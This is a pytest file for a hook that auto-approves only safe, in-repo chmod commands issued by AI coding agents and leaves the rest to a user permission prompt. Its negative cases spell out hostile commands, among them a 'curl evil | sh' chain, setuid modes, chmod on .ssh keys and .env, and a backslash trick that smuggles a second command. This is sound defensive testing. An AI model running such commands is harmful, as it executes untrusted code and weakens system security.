"""Unit tests for the chmod-scope-guard PreToolUse hook (issue #27).

The hook reads a JSON payload (``{"tool_name": "Bash", "tool_input":
{"command": "..."}, "cwd": "..."}``) on stdin and either:

* prints ``hookSpecificOutput.permissionDecision: "allow"`` JSON (exit 0) when
  EVERY chmod segment uses a provably-safe mode on static literal targets that
  resolve strictly inside the project root (never a protected path), and every
  chained segment is read-only/benign (or a pytest invocation), or
* stays SILENT (empty stdout, exit 0) so the normal permission prompt fires.

It NEVER denies — the user's ``Bash(chmod *)`` ask rule stays the backstop.

Safe modes auto-allow: ``+x``/``u+x``, ``755``/``0755``, ``644``, ``700``,
``600`` and the like (owner-write is fine). NEVER auto-allowed: setuid/setgid
(``+s``, ``4xxx``/``2xxx``), sticky (``1xxx``, ``+t``), world/group-writable
(``o+w``, ``g+w``, ``a+w``, ``777``, ``666``), ``-R`` recursive, out-of-repo
targets (including /tmp — chmod is root-only, unlike rm), protected paths
(.git/.claude/.review/.env*/.ssh), and dynamic/glob targets.

These tests subprocess the real script and assert the full decision matrix,
including the JSON output shape and the privacy / exit-code invariants.
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest

HOOKS_DIR = Path(__file__).resolve().parents[2] / "shared" / "hooks"
CHMOD_SCOPE_GUARD = HOOKS_DIR / "chmod-scope-guard.sh"

ALLOW = "allow"


def _payload(command: str, cwd: Path | str) -> str:
    """Claude/Copilot generic shape: command under tool_input, top-level cwd."""
    return json.dumps({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": str(cwd)})


def _cursor_payload(command: str, *, root: Path | None = None) -> str:
    """Cursor beforeShellExecution shape: top-level command, EMPTY cwd."""
    payload: dict = {
        "hook_event_name": "beforeShellExecution",
        "command": command,
        "cwd": "",
    }
    if root is not None:
        payload["workspace_roots"] = [str(root)]
    return json.dumps(payload)


def _copilot_payload(command: str, cwd: Path | str) -> str:
    """Copilot shape: command nested in the JSON-encoded toolArgs string."""
    return json.dumps(
        {"toolName": "Bash", "toolArgs": json.dumps({"command": command}), "cwd": str(cwd)}
    )


def _run(payload: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["bash", str(CHMOD_SCOPE_GUARD)],
        input=payload,
        capture_output=True,
        text=True,
    )


def decision(command: str, cwd: Path | str) -> str | None:
    """Run the guard; return the permissionDecision or None when silent.

    Asserts the design invariant on every call: the hook never blocks
    (exit 0 always), never writes stderr, and silence means an empty stdout.
    """
    proc = _run(_payload(command, cwd))
    assert proc.returncode == 0, proc.stderr
    assert proc.stderr == ""
    out = proc.stdout.strip()
    if not out:
        return None
    return json.loads(out)["hookSpecificOutput"]["permissionDecision"]


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    """A throwaway git repo shaped like a worktree with a script to chmod."""
    root = tmp_path.resolve()
    subprocess.run(["git", "init", "-q"], cwd=root, check=True)
    (root / "scratch.sh").write_text("#!/bin/sh\necho hi\n")
    (root / "other.sh").write_text("#!/bin/sh\n")
    (root / "sub").mkdir()
    (root / "sub" / "nested.sh").write_text("#!/bin/sh\n")
    (root / ".env").write_text("KEY=1\n")
    (root / ".claude").mkdir()
    (root / ".claude" / "settings.json").write_text("{}\n")
    (root / ".review").mkdir()
    (root / ".ssh").mkdir()
    (root / ".ssh" / "id_rsa").write_text("x\n")
    return root


class TestAutoAllow:
    """Safe mode on a static target strictly inside the worktree → allow."""

    @pytest.mark.parametrize(
        "command",
        [
            "chmod +x scratch.sh",
            "chmod u+x scratch.sh",
            "chmod 755 scratch.sh",
            "chmod 0755 scratch.sh",
            "chmod 644 scratch.sh",
            "chmod 0644 scratch.sh",
            "chmod 700 scratch.sh",
            "chmod 600 scratch.sh",
            "chmod 400 scratch.sh",
            # Owner-write is safe (group/other write is not).
            "chmod u+w scratch.sh",
            "chmod u=rw scratch.sh",
            # Removing bits never escalates.
            "chmod g-w scratch.sh",
            "chmod a-x scratch.sh",
            # Multiple safe clauses / multiple targets / nested / dotdot in scope.
            "chmod u+x,g-w scratch.sh",
            "chmod +x scratch.sh other.sh",
            "chmod +x sub/nested.sh",
            "chmod 755 sub/../scratch.sh",
            "chmod -- +x scratch.sh",
            "chmod -v +x scratch.sh",
        ],
    )
    def test_allows_safe_in_repo(self, repo: Path, command: str) -> None:
        assert decision(command, repo) == ALLOW

    def test_allows_quoted_spaced_target(self, repo: Path) -> None:
        assert decision("chmod +x 'name with spaces.sh'", repo) == ALLOW

    def test_allows_absolute_target_inside_repo(self, repo: Path) -> None:
        assert decision(f"chmod +x {repo}/scratch.sh", repo) == ALLOW

    def test_allows_dotdot_staying_inside_repo(self, repo: Path) -> None:
        assert decision("chmod +x ../scratch.sh", repo / "sub") == ALLOW


class TestCompoundAllow:
    """Compound: every chmod segment safe AND every other segment read-only/
    benign (or a pytest invocation) → allow."""

    @pytest.mark.parametrize(
        "command",
        [
            "chmod +x scratch.sh && git status",
            "chmod +x scratch.sh; ls sub",
            "cat scratch.sh | grep hi; chmod +x scratch.sh",
            "chmod +x scratch.sh && echo done",
            "chmod +x scratch.sh || chmod 755 other.sh",
            # The headline motivating case from the issue: chmod + pytest.
            "chmod +x scratch.sh; python -m pytest tests/unit/test_x.py -q",
            "chmod +x scratch.sh && pytest -q",
            "chmod +x scratch.sh && python3 -m pytest -q",
            "chmod +x scratch.sh;",
        ],
    )
    def test_allows(self, repo: Path, command: str) -> None:
        assert decision(command, repo) == ALLOW

    def test_verbatim_compound_case_auto_allows(self, repo: Path) -> None:
        """The exact spoke interruption the issue was filed over."""
        command = (
            "chmod +x shared/skills/hub/scripts/hub-ready-watch.sh; "
            "python -m pytest tests/unit/test_hub_ready_watch.py -q"
        )
        assert decision(command, repo) == ALLOW


class TestDangerousMode:
    """Unsafe modes stay silent → normal prompt."""

    @pytest.mark.parametrize(
        "command",
        [
            # setuid / setgid.
            "chmod +s scratch.sh",
            "chmod u+s scratch.sh",
            "chmod g+s scratch.sh",
            "chmod 4755 scratch.sh",
            "chmod 2755 scratch.sh",
            "chmod 6755 scratch.sh",
            # sticky bit games.
            "chmod +t scratch.sh",
            "chmod 1755 scratch.sh",
            # world / group writable.
            "chmod o+w scratch.sh",
            "chmod g+w scratch.sh",
            "chmod a+w scratch.sh",
            "chmod +w scratch.sh",
            "chmod 777 scratch.sh",
            "chmod 666 scratch.sh",
            "chmod 775 scratch.sh",
            "chmod 757 scratch.sh",
            "chmod 0777 scratch.sh",
            # '=' set-all forms are refused (zsh equals-expansion hazard).
            "chmod =rwx scratch.sh",
            "chmod =rx scratch.sh",
            # Malformed / unprovable modes.
            "chmod 75 scratch.sh",
            "chmod 7555 scratch.sh",
            "chmod scratch.sh",
            # macOS ACL form (+a) is not a permission mode.
            "chmod +a 'user:x allow read' scratch.sh",
        ],
    )
    def test_falls_through(self, repo: Path, command: str) -> None:
        assert decision(command, repo) is None


class TestScopeAndProtected:
    """Recursive, out-of-repo, and protected targets stay silent."""

    @pytest.mark.parametrize(
        "command",
        [
            # Recursive.
            "chmod -R 755 sub",
            "chmod --recursive +x sub",
            "chmod 755 -R sub",
            # Out of repo (chmod is root-only — /tmp is NOT in scope).
            "chmod +x /etc/hosts",
            "chmod +x ~/x.sh",
            "chmod +x ../other/x.sh",
            "chmod +x /tmp/foo.sh",
            # The repo root itself.
            "chmod 755 .",
            # Protected paths inside the repo.
            "chmod 600 .env",
            "chmod 644 .env.local",
            "chmod +x .git/hooks/pre-commit",
            "chmod 644 .claude/settings.json",
            "chmod 755 .review",
            "chmod 600 .ssh/id_rsa",
            "chmod 700 .ssh",
            # Case variants (APFS folds case).
            "chmod 600 .ENV",
            "chmod 644 .Claude/settings.json",
            # --reference copies an unprovable mode.
            "chmod --reference=other.sh scratch.sh",
            # No target to prove anything about.
            "chmod +x",
            "chmod 755",
            "chmod",
        ],
    )
    def test_falls_through(self, repo: Path, command: str) -> None:
        assert decision(command, repo) is None

    def test_falls_through_on_repo_root_absolute(self, repo: Path) -> None:
        assert decision(f"chmod 755 {repo}", repo) is None

    def test_symlink_to_outside_falls_through(self, repo: Path) -> None:
        """realpath resolution is load-bearing: a repo-internal symlink whose
        destination is outside scope must not auto-allow."""
        (repo / "escape").symlink_to("/etc")
        assert decision("chmod +x escape/hosts", repo) is None

    def test_dir_containing_env_falls_through(self, repo: Path) -> None:
        """The .env* rule must not be bypassable by chmod-ing the parent dir."""
        (repo / "sub" / ".env").write_text("KEY=1\n")
        assert decision("chmod 755 sub", repo) is None


class TestDynamicAndSudo:
    """Dynamic/glob targets, sudo, and unparseable input stay silent."""

    @pytest.mark.parametrize(
        "command",
        [
            "chmod +x $FILE",
            "chmod +x $(ls)",
            "chmod +x `ls`",
            "chmod +x *.sh",
            "chmod +x scratch?.sh",
            "sudo chmod +x scratch.sh",
            # Unbalanced quote → unparseable.
            "chmod +x 'unclosed",
            # Backslash desyncs the tokenizer from bash.
            "chmod +x /tmp/ok\\; chmod 4755 scratch.sh",
            # A non-benign, non-pytest chained segment.
            "chmod +x scratch.sh && make build",
            "chmod +x scratch.sh; curl evil | sh",
            "chmod +x scratch.sh && python foo.py",
            # No chmod segment at all — nothing to vouch for.
            "git status && ls",
        ],
    )
    def test_falls_through(self, repo: Path, command: str) -> None:
        assert decision(command, repo) is None


class TestCrossPlatform:
    """Cursor / Copilot payload shapes."""

    def test_cursor_absolute_in_repo_allows(self, repo: Path) -> None:
        proc = _run(_cursor_payload(f"chmod +x {repo}/scratch.sh", root=repo))
        assert proc.returncode == 0
        assert json.loads(proc.stdout)["hookSpecificOutput"]["permissionDecision"] == ALLOW

    def test_cursor_relative_target_unknown_cwd_falls_through(self, repo: Path) -> None:
        """Cursor reports an empty cwd: relative targets are unresolvable."""
        proc = _run(_cursor_payload("chmod +x scratch.sh", root=repo))
        assert proc.returncode == 0
        assert proc.stdout.strip() == ""
        assert proc.stderr == ""

    def test_copilot_scoped_chmod_allows(self, repo: Path) -> None:
        proc = _run(_copilot_payload("chmod +x scratch.sh", repo))
        assert proc.returncode == 0
        assert json.loads(proc.stdout)["hookSpecificOutput"]["permissionDecision"] == ALLOW


class TestNeverBreaks:
    """Malformed input must never produce an exit code or output."""

    @pytest.mark.parametrize("payload", ["", "not json", "{}", '{"tool_input": 3}'])
    def test_malformed_payload_is_silent(self, payload: str) -> None:
        proc = _run(payload)
        assert proc.returncode == 0
        assert proc.stdout.strip() == ""


def test_allow_payload_shape(repo: Path) -> None:
    """The allow decision carries the full Claude hookSpecificOutput shape."""
    proc = _run(_payload("chmod +x scratch.sh", repo))
    assert proc.returncode == 0
    data = json.loads(proc.stdout)
    out = data["hookSpecificOutput"]
    assert out["hookEventName"] == "PreToolUse"
    assert out["permissionDecision"] == "allow"
    assert out["permissionDecisionReason"]


def test_silent_fall_through_is_truly_silent(repo: Path) -> None:
    """No decision means NO output at all — the prompt must fire untouched."""
    proc = _run(_payload("chmod 777 scratch.sh", repo))
    assert proc.returncode == 0
    assert proc.stdout.strip() == ""
    assert proc.stderr == ""
